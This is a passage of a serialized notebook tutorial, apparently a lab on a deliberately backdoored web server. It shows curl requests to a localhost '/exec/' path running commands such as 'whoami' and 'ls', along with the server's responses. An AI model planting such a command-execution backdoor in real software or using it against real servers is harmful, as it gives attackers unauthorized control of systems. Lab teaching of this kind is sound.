is:","position":{"start":{"line":7,"column":1},"end":{"line":7,"column":1}},"key":"VI5pvJJkNO"}],"key":"eseFgOzJXs"},{"type":"code","lang":"","value":"HTTP/1.1 404 Not Found","position":{"start":{"line":9,"column":1},"end":{"line":11,"column":1}},"key":"Qy3rMW4oXv"}],"key":"kGfn2RpmGx"},{"type":"block","kind":"notebook-content","children":[{"type":"paragraph","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"children":[{"type":"text","value":"However, if we send a request with the ","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"NyMSeLLA2C"},{"type":"inlineCode","value":"/exec/","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"lXPs5lEEDI"},{"type":"text","value":" keyword, we can execute commands on the server. For example:","position":{"start":{"line":1,"column":1},"end":{"line":1,"column":1}},"key":"coJ6axmz4F"}],"key":"EKte5dADxe"},{"type":"code","lang":"bash","value":"curl -i http://127.0.0.1:8080/exec/whoami","position":{"start":{"line":3,"column":1},"end":{"line":5,"column":1}},"key":"ifbrlFki9f"},{"type":"paragraph","position":{"start":{"line":7,"column":1},"end":{"line":7,"column":1}},"children":[{"type":"text","value":"The response will be:","position":{"start":{"line":7,"column":1},"end":{"line":7,"column":1}},"key":"Sk9PBUqRQd"}],"key":"a5W38ZrhQo"},{"type":"code","lang":"","value":"HTTP/1.1 200 OK\n\nhaxor","position":{"start":{"line":9,"column":1},"end":{"line":13,"column":1}},"key":"LTMgFLOhdN"},{"type":"paragraph","position":{"start":{"line":15,"column":1},"end":{"line":15,"column":1}},"children":[{"type":"text","value":"Another example:","position":{"start":{"line":15,"column":1},"end":{"line":15,"column":1}},"key":"meYNkMzxgw"}],"key":"rUF0JbzoH8"},{"type":"code","lang":"bash","value":"curl -i http://127.0.0.1:8080/exec/ls","position":{"start":{"line":17,"column":1},"end":{"line":19,"column":1}},"key":"e3i9jLPwkT"},{"type":"paragraph","position":{"start":{"line":21,"column":1},"end":{"line":21,"column":1}},"children":[{"type":"text","value":"The response will be:","position":{"start":{"line":21,"column":1},"end":{"line":21,"column":1}},"key":"rE5XshLcDA"}],"key":"u1tdffTxVU"},{"type":"code","lang":"","value":"HTTP/1.1 200 OK\n\nbackdoored_webserver\nbackdoored_webserver.c","position":{"start":{"line":23,"column":1},"end":{"line":28,"column":1}},"key":"iM8P8pG7Zq"}],"key":"mSDJtnlpp4"}],"key":"eZNVHGGTUf"},"references":{"cite":{"order":[],"data":{}}}}